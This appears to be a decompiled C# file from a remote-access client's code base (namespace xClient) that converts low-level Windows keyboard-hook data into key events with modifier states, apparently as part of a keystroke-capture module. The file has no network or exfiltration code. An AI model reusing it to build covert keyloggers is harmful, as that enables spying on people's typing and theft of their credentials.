using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook
{
	// Token: 0x02000068 RID: 104
	public class KeyEventArgsExt : KeyEventArgs
	{
		// Token: 0x060002CE RID: 718 RVA: 0x00003524 File Offset: 0x00001724
		public KeyEventArgsExt(Keys keyData) : base(keyData)
		{
		}

		// Token: 0x060002CF RID: 719 RVA: 0x0000352D File Offset: 0x0000172D
		internal KeyEventArgsExt(Keys keyData, int timestamp, bool isKeyDown, bool isKeyUp) : this(keyData)
		{
			this.Timestamp = timestamp;
			this.IsKeyDown = isKeyDown;
			this.IsKeyUp = isKeyUp;
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060002D0 RID: 720 RVA: 0x0000354C File Offset: 0x0000174C
		// (set) Token: 0x060002D1 RID: 721 RVA: 0x00003554 File Offset: 0x00001754
		public int Timestamp { get; private set; }

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060002D2 RID: 722 RVA: 0x0000355D File Offset: 0x0000175D
		// (set) Token: 0x060002D3 RID: 723 RVA: 0x00003565 File Offset: 0x00001765
		public bool IsKeyDown { get; private set; }

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060002D4 RID: 724 RVA: 0x0000356E File Offset: 0x0000176E
		// (set) Token: 0x060002D5 RID: 725 RVA: 0x00003576 File Offset: 0x00001776
		public bool IsKeyUp { get; private set; }

		// Token: 0x060002D6 RID: 726 RVA: 0x0000E990 File Offset: 0x0000CB90
		internal static KeyEventArgsExt FromRawDataApp(CallbackData data)
		{
			IntPtr wparam = data.WParam;
			IntPtr lparam = data.LParam;
			int tickCount = Environment.TickCount;
			uint num = (uint)lparam.ToInt64();
			bool flag = (num & 1073741824U) > 0U;
			bool flag2 = (num & 2147483648U) > 0U;
			Keys keyData = KeyEventArgsExt.AppendModifierStates((Keys)((int)wparam));
			bool isKeyDown = !flag && !flag2;
			bool isKeyUp = flag && flag2;
			return new KeyEventArgsExt(keyData, tickCount, isKeyDown, isKeyUp);
		}

		// Token: 0x060002D7 RID: 727 RVA: 0x0000EA08 File Offset: 0x0000CC08
		internal static KeyEventArgsExt FromRawDataGlobal(CallbackData data)
		{
			IntPtr wparam = data.WParam;
			IntPtr lparam = data.LParam;
			KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lparam, typeof(KeyboardHookStruct));
			Keys keyData = KeyEventArgsExt.AppendModifierStates((Keys)keyboardHookStruct.VirtualKeyCode);
			int num = (int)wparam;
			bool isKeyDown = num == 256 || num == 260;
			bool isKeyUp = num == 257 || num == 261;
			return new KeyEventArgsExt(keyData, keyboardHookStruct.Time, isKeyDown, isKeyUp);
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x0000357F File Offset: 0x0000177F
		private static bool CheckModifier(int vKey)
		{
			return ((int)KeyboardNativeMethods.GetKeyState(vKey) & 32768) > 0;
		}

		// Token: 0x060002D9 RID: 729 RVA: 0x0000EA90 File Offset: 0x0000CC90
		private static Keys AppendModifierStates(Keys keyData)
		{
			bool flag = KeyEventArgsExt.CheckModifier(17);
			bool flag2 = KeyEventArgsExt.CheckModifier(16);
			bool flag3 = KeyEventArgsExt.CheckModifier(18);
			return keyData | (flag ? Keys.Control : Keys.None) | (flag2 ? Keys.Shift : Keys.None) | (flag3 ? Keys.Alt : Keys.None);
		}
	}
}
